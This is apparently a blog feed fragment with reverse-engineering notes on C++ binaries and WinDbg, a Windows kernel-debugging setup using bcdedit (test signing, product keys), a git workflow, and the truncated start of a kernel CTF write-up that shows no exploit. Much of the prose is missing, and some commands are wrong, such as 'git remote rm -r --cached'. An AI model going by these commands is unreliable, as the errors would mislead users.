class="line">.text:<span class="number">0000000140011</span>D13                 mov     r8d, <span class="number">3</span>          ; c</span><br><span class="line">.text:<span class="number">0000000140011</span>D19                 mov     edx, <span class="number">2</span>          ; b</span><br><span class="line">.text:<span class="number">0000000140011</span>D1E                 mov     ecx, [rbp+<span class="number">0F</span>0h+a] ; a</span><br><span class="line">.text:<span class="number">0000000140011</span>D21                 call    j_?func@@YAHHHHHHHH@Z ; <span class="built_in">func</span>(<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>)</span><br></pre></td></tr></table></figure><p> x86  cdecl call</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0041253</span>C                 push    <span class="number">7</span>               ; g</span><br><span class="line">.text:<span class="number">0041253</span>E                 push    <span class="number">6</span>               ; f</span><br><span class="line">.text:<span class="number">00412540</span>                 push    <span class="number">5</span>               ; e</span><br><span class="line">.text:<span class="number">00412542</span>                 push    <span class="number">4</span>               ; d</span><br><span class="line">.text:<span class="number">00412544</span>                 push    <span class="number">3</span>               ; c</span><br><span class="line">.text:<span class="number">00412546</span>                 push    <span class="number">2</span>               ; b</span><br><span class="line">.text:<span class="number">00412548</span>                 mov     eax, [ebp+a]</span><br><span class="line">.text:<span class="number">0041254B</span>                 push    eax             ; a</span><br><span class="line">.text:<span class="number">0041254</span>C                 call    j_?func@@YAHHHHHHHH@Z ; <span class="built_in">func</span>(<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>)</span><br></pre></td></tr></table></figure><p> <code>rax</code> </p><h2 id="Class"><a href="#Class" class="headerlink" title="Class"></a>Class</h2><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> _age;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Person</span>() &#123;</span><br><span class="line">_age = <span class="number">0</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;person&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">virtual</span> ~<span class="built_in">Person</span>() &#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;~person&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">int</span> <span class="title">GetAge</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">SetAge</span><span class="params">(<span class="type">int</span> age)</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Boy</span> : <span class="keyword">public</span> Person &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Boy</span>() &#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;boy&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">virtual</span> ~<span class="built_in">Boy</span>() &#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;~boy&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">GetAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;boy getage&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">114</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SetAge</span><span class="params">(<span class="type">int</span> age)</span> </span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;boy setage&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">std::vector&lt;Boy&gt; boys;</span><br><span class="line">Boy b;</span><br><span class="line">boys.<span class="built_in">push_back</span>(b);</span><br><span class="line"><span class="keyword">auto</span> f = [](<span class="type">int</span> a, <span class="type">int</span> b) -&gt; <span class="type">int</span> &#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;lambda&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> a + b;</span><br><span class="line">&#125;;</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">f</span>(<span class="number">1</span>, <span class="number">2</span>) &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>C++  <code>std::cout</code>  <code>__imp_?cout@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A:qword</code></p><ul><li></li></ul><p><code>MSVC</code> <code>g++</code></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p></p><p></p><p> <code>this</code> </p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall <span class="title">Boy::Boy</span><span class="params">(Boy *<span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  Person::<span class="built_in">Person</span>(<span class="keyword">this</span>);</span><br><span class="line">  *(_QWORD *)<span class="keyword">this</span> = off_4CC8;   <span class="comment">// </span></span><br><span class="line">  v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;boy&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall Boy::~<span class="built_in">Boy</span>(Boy *<span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)<span class="keyword">this</span> = off_4CC8; <span class="comment">// vfptr</span></span><br><span class="line">  v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;~boy&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  Person::~<span class="built_in">Person</span>(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>CPP</p><p></p><ul><li><code>Set&lt;String&gt; m = new HashMap&lt;String&gt;</code></li></ul><p><code>cpp</code><code>vftable</code></p><ul><li></li></ul><p><strong></strong></p><ul><li></li></ul><p><code>vfptr</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:<span class="number">0000000000004</span>CC8 off_4CC8        dq offset _ZN3BoyD2Ev   ; DATA XREF: Boy::<span class="built_in">Boy</span>(<span class="type">void</span>)+<span class="number">1</span>Do</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>CC8                                         ; Boy::~<span class="built_in">Boy</span>()+<span class="number">10</span>o ...</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>CC8                                         ; Boy::~<span class="built_in">Boy</span>()</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>CD0                 dq offset _ZN3BoyD0Ev   ; Boy::~<span class="built_in">Boy</span>()</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>CD8                 dq offset _ZN3Boy6GetAgeEv ; Boy::<span class="built_in">GetAge</span>(<span class="type">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>CE0                 dq offset _ZN3Boy6SetAgeEi ; Boy::<span class="built_in">SetAge</span>(<span class="type">int</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>CE8                 <span class="keyword">public</span> _ZTV6Person ; weak</span><br></pre></td></tr></table></figure><p><strong></strong></p><ul><li></li></ul><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=%d\n&quot;</span>, a);</span><br><span class="line">    <span class="type">int</span> *p = &amp;a;</span><br><span class="line">    *p = <span class="number">200</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=%d\n&quot;</span>, a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, <span class="number">20</span>h</span><br><span class="line">mov     rax, fs:<span class="number">28</span>h</span><br><span class="line">mov     [rbp+var_8], rax  </span><br><span class="line"><span class="keyword">xor</span>     eax, eax</span><br><span class="line">mov     [rbp+var_14], <span class="number">64</span>h ; <span class="string">&#x27;d&#x27;</span></span><br><span class="line">mov     eax, [rbp+var_14]</span><br><span class="line">mov     esi, eax</span><br><span class="line">lea     rax, format     ; <span class="string">&quot;a=%d\n&quot;</span></span><br><span class="line">mov     rdi, rax        ; format</span><br><span class="line">mov     eax, <span class="number">0</span></span><br><span class="line">call    _printf</span><br><span class="line">lea     rax, [rbp+var_14]</span><br><span class="line">mov     [rbp+var_10], rax  ; *p</span><br><span class="line">mov     rax, [rbp+var_10]</span><br><span class="line">mov     dword ptr [rax], <span class="number">0</span>C8h</span><br><span class="line">mov     eax, [rbp+var_14]</span><br><span class="line">mov     esi, eax</span><br><span class="line">lea     rax, format     ; <span class="string">&quot;a=%d\n&quot;</span></span><br><span class="line">mov     rdi, rax        ; format</span><br><span class="line">mov     eax, <span class="number">0</span></span><br><span class="line">call    _printf</span><br></pre></td></tr></table></figure><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=%d\n&quot;</span>, a);</span><br><span class="line">    <span class="type">int</span> &amp;p = a;</span><br><span class="line">    p = <span class="number">200</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=%d\n&quot;</span>, a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, <span class="number">20</span>h</span><br><span class="line">mov     rax, fs:<span class="number">28</span>h</span><br><span class="line">mov     [rbp+var_8], rax</span><br><span class="line"><span class="keyword">xor</span>     eax, eax</span><br><span class="line">mov     [rbp+var_14], <span class="number">64</span>h ; <span class="string">&#x27;d&#x27;</span></span><br><span class="line">mov     eax, [rbp+var_14]</span><br><span class="line">mov     esi, eax</span><br><span class="line">lea     rax, format     ; <span class="string">&quot;a=%d\n&quot;</span></span><br><span class="line">mov     rdi, rax        ; format</span><br><span class="line">mov     eax, <span class="number">0</span></span><br><span class="line">call    _printf</span><br><span class="line">lea     rax, [rbp+var_14]</span><br><span class="line">mov     [rbp+var_10], rax</span><br><span class="line">mov     rax, [rbp+var_10]</span><br><span class="line">mov     dword ptr [rax], <span class="number">0</span>C8h</span><br><span class="line">mov     eax, [rbp+var_14]</span><br><span class="line">mov     esi, eax</span><br><span class="line">lea     rax, format     ; <span class="string">&quot;a=%d\n&quot;</span></span><br><span class="line">mov     rdi, rax        ; format</span><br><span class="line">mov     eax, <span class="number">0</span></span><br><span class="line">call    _printf</span><br></pre></td></tr></table></figure><p>C++</p><p></p><ul><li></li></ul><h2 id="lambda-"><a href="#lambda-" class="headerlink" title="lambda "></a>lambda </h2><p>lambda </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">v3 = main::&#123;<span class="built_in">lambda</span>(<span class="type">int</span>,<span class="type">int</span>)#<span class="number">1</span>&#125;::<span class="built_in">operator</span>()(&amp;v6, <span class="number">1LL</span>, <span class="number">2LL</span>);</span><br><span class="line"> </span><br><span class="line">__int64 __fastcall main::&#123;<span class="built_in">lambda</span>(<span class="type">int</span>,<span class="type">int</span>)#<span class="number">1</span>&#125;::<span class="built_in">operator</span>()(__int64 a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v3 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;lambda&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)(a2 + a3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="debugger"><a href="#debugger" class="headerlink" title="debugger"></a>debugger</h2><p>WinDbg <a href="http://windbg.info/doc/1-common-cmds.html">Common WinDbg Commands </a><br>x64dbg <a href="https://help.x64dbg.com/en/latest/">  x64dbg documentation</a> </p><p>windbg  preview </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  b</span></span><br><span class="line">bp: </span><br><span class="line">bl: list</span><br><span class="line">bc: clear</span><br><span class="line"></span><br><span class="line"><span class="comment">//  display/dump</span></span><br><span class="line">d&#123;a|b|c|d|D|f|p|q|u|w|W&#125; [Options] [Range]</span><br><span class="line">db: dump byte</span><br><span class="line">dw: word</span><br><span class="line">dd: dword</span><br><span class="line">dq: qword</span><br><span class="line">dt: type</span><br><span class="line"></span><br><span class="line"><span class="comment">// </span></span><br><span class="line">g: go</span><br><span class="line">t: trace</span><br><span class="line">p: </span><br><span class="line"></span><br><span class="line"><span class="comment">// </span></span><br><span class="line">r: <span class="keyword">register</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// </span></span><br><span class="line">k: dump stack</span><br><span class="line">.frame</span><br><span class="line"></span><br><span class="line"><span class="comment">// </span></span><br><span class="line">s: search</span><br><span class="line"></span><br><span class="line"><span class="comment">// </span></span><br><span class="line">e: edit</span><br></pre></td></tr></table></figure><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.echo </span><br><span class="line">.reboot</span><br><span class="line">.reload</span><br><span class="line">.cls: </span><br><span class="line">.help</span><br></pre></td></tr></table></figure><p>x64dbg </p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows</title>
      <link href="/2024/01/18/Windows%20%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/"/>
      <url>/2024/01/18/Windows%20%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<blockquote><p></p></blockquote><span id="more"></span><h2 id="windows-vm"><a href="#windows-vm" class="headerlink" title="windows vm"></a>windows vm</h2><h3 id="win10-11-"><a href="#win10-11-" class="headerlink" title="win10&#x2F;11 "></a>win10&#x2F;11 </h3><p>VMgadget</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">KH2J9-PC326-T44D4-39H6V-TVPBY   // 10</span><br><span class="line">BCQNW-3VWYB-4V7QD-M6R2B-7MH26   // 11</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>WinDbg preview &gt; File &gt; setting &gt; debugging setting &gt; default symbol path</p><ul><li></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">srv*C:\Symbols*https://msdl.microsoft.com/download/symbols</span><br></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h5 id=""><a href="#" class="headerlink" title=""></a></h5><p>WinDbg </p><ul><li><code>\\.\pipe\com_1</code></li><li>windbg  attach to kernel</li></ul><p>cmd</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /dbgsettings serial baudrate:115200 debugport:1</span><br><span class="line">bcdedit /copy &quot;&#123;current&#125;&quot; /d WinDebug        # uuid</span><br><span class="line">bcdedit /displayorder &quot;&#123;current&#125;&quot; &quot;&#123;uuid&#125;&quot;   # </span><br><span class="line">bcdedit /debug &quot;&#123;uuid&#125;&quot; on                   # debug</span><br></pre></td></tr></table></figure><p>windbg attach kernel</p><ul><li>115200</li><li></li><li>resets: 0</li></ul><p>   <code>win+r</code>  msconfig</p><h5 id=""><a href="#" class="headerlink" title=""></a></h5><p><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/setting-up-a-network-debugging-connection">Set up KDNET network kernel debugging manually</a></p><figure class="highlight pwsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /debug on</span><br><span class="line">bcdedit /dbgsettings net hostip:w.x.y.z port:n</span><br><span class="line">shutdown <span class="literal">-r</span> <span class="literal">-t</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><p></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bcdedit/<span class="built_in">set</span> testsigning on</span><br></pre></td></tr></table></figure><p> <code>Debuggee is running...</code> <code>break</code> </p><p> <code>VS</code> </p><p><a href="https://bbs.kanxue.com/thread-261326.htm"></a></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git-work-flows</title>
      <link href="/2023/11/20/git-workflow/"/>
      <url>/2023/11/20/git-workflow/</url>
      
        <content type="html"><![CDATA[<blockquote><p>git</p></blockquote><span id="more"></span><p>github <code>add commit push</code> </p><p>git clone git pull <br>add <br> commit fetch <br>push </p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ol><li>git clone </li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> &lt;remote&gt;</span><br><span class="line">git checkout -b feature/windows</span><br><span class="line">git branch -a</span><br></pre></td></tr></table></figure><ol start="2"><li></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># </span></span><br><span class="line">git diff     <span class="comment"># diff</span></span><br><span class="line">git add xxx</span><br><span class="line">git commit   <span class="comment">#  vim  commit  </span></span><br></pre></td></tr></table></figure><ol start="3"><li>push </li></ol><ul><li>branch</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># main </span></span><br><span class="line">git checkout main</span><br><span class="line">git fetch origin</span><br><span class="line">git diff</span><br><span class="line">git pull origin main</span><br><span class="line">git checkout feature/windows</span><br><span class="line"></span><br><span class="line"><span class="comment"># rebase: maincommitcommit</span></span><br><span class="line">git rebase main</span><br><span class="line">git push -f origin feature/windows</span><br></pre></td></tr></table></figure><ol start="4"><li>main </li></ol><ul><li> github  <code>pr(pull request)</code> <code>feature/windows</code>  <code>main</code> </li><li></li><li> <code>feature/windows</code> </li><li></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git checkout main</span><br><span class="line">git branch -D feature/windows</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">git pull origin main</span><br></pre></td></tr></table></figure><p></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ol><li><code>.gitignore</code></li><li>git submodule </li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># clone .submodule </span></span><br><span class="line">git submodule add https://github.com/chaconinc/DbConnector</span><br><span class="line"></span><br><span class="line">git submodule update --remote &lt;repo&gt;</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>bug </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">git branch -a  <span class="comment"># </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># tag</span></span><br><span class="line">git checkout &lt;branch&gt; &lt;tag&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line">git checkout &lt;branch&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># commit </span></span><br><span class="line">git <span class="built_in">log</span></span><br><span class="line">git checkout &lt;comit_hash&gt;</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git remote <span class="built_in">rm</span> -r --cached &lt;<span class="built_in">dir</span>/filename&gt;</span><br><span class="line">git commit -m <span class="string">&quot;delete&quot;</span></span><br><span class="line">git push origin main</span><br></pre></td></tr></table></figure><p>IDE</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mimic-water-ker</title>
      <link href="/2023/11/11/mimic-water-ker/"/>
      <url>/2023/11/11/mimic-water-ker/</url>
      
        <content type="html"><![CDATA[<blockquote><p></p></blockquote><span id="more"></span><h2 id="water-ker"><a href="#water-ker" class="headerlink" title="water-ker"></a>water-ker</h2><p> <code>.config</code> </p><p> LKM</p><ul><li>chunk</li><li>freeUAF</li><li> edit 1</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 